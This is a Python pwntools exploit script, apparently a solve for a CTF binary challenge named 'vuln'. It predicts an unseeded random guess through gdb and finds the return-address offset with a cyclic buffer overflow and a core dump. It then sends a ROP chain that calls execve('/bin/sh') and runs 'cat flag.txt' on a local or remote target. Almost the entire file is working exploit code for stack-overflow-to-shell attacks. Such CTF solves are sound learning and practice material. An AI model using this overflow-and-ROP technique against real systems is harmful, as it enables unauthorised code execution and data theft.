#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the <CTF> challenge <name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

GDB_COMMAND = '''
file ./vuln
'''
# For whatever reason, we can resolve the symbol to `increment` but it comes back wrong? This points to the return after `increment` has finished inside of main.
INCREMENT_ADDRESS = 0x00400bbc
NUM_CYCLIC_BYTES = 360

def get_incremented_value():
    '''Open a debugger and get the value returned from the function `increment`. This is checked against the user's input. If the numbers match, we win!
    '''

    with gdb.debug(exe.path, gdbscript=GDB_COMMAND, api=True) as vuln:
        # Add our breakpoint (we could do this in the gdbscript, but I like the API).
        vuln.gdb.Breakpoint('* ' + str(INCREMENT_ADDRESS))

        vuln.gdb.continue_and_wait()

        # Get the selected frame, which will allow us to extract information regarding things like the registers, stack, etc.
        frame = vuln.gdb.selected_frame()

        # Get the return value of increment. This should be the same each time since the developer did not seed rand.
        rax = frame.read_register('rax')

        # Cast as an integer.
        return int(rax.cast(vuln.gdb.lookup_type('long')))


def find_offset_to_return_address(incremented_value):
    '''Purposefully overflow the buffer with a cyclic pattern and then inspect
    what the crashing address is. Returns the offset to the return address.
    '''
    # Run the process once so that it crashes.
    proc = process([exe.path])

    # Send the answer to the first question.
    proc.sendlineafter(b'What number would you like to guess?\n', str(incremented_value))

    # Generate a cyclic pattern so that we can auto-find the offset.
    payload = cyclic(NUM_CYCLIC_BYTES)

    # Send the cyclic pattern
    proc.sendlineafter(b'Congrats! You win! Your prize is this print statement!\n', payload)
    proc.wait()

    # Get the core dump.
    core = proc.corefile

    # The faulting address should be some subset of bytes inside our cyclic
    # pattern.
    assert pack(core.fault_addr) in payload, "Faulting address not in the \
                                                cyclic pattern."

    # Find our offset.
    offset = cyclic_find(pack(core.fault_addr), n=4)
    return offset


def call_execve():
    '''Return the ROP chain to land a shell.
    '''
    rop = ROP(exe)
    rop.call('execve', [b'/bin/sh'])
    return rop.chain()


def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('addr', 4141)

    else:
        io = process([exe.path])

    return io



def main():
    '''Return the flag.
    '''
    # Get our initial information.
    with process([exe.path]) as io:
        # Get the answer, which is a 'random' value incremented by one.
        answer = get_incremented_value()
        log.info(f'The answer is: {answer}')

        # Pass the answer to the first question.
        offset = find_offset_to_return_address(answer)
        log.info(f'The offset to the return address is: {offset}')

    with conn() as io:
        # Send the first answer.
        io.sendlineafter(b'What number would you like to guess?\n', str(answer))

        ropchain = fit ({
            offset: call_execve()
        })

        print(ropchain)
        io.sendlineafter(b'Name? ', ropchain)
        io.recvline()
        io.recvline()

        io.sendline(b'cat flag.txt')




if __name__ == "__main__":
    main()
    pass

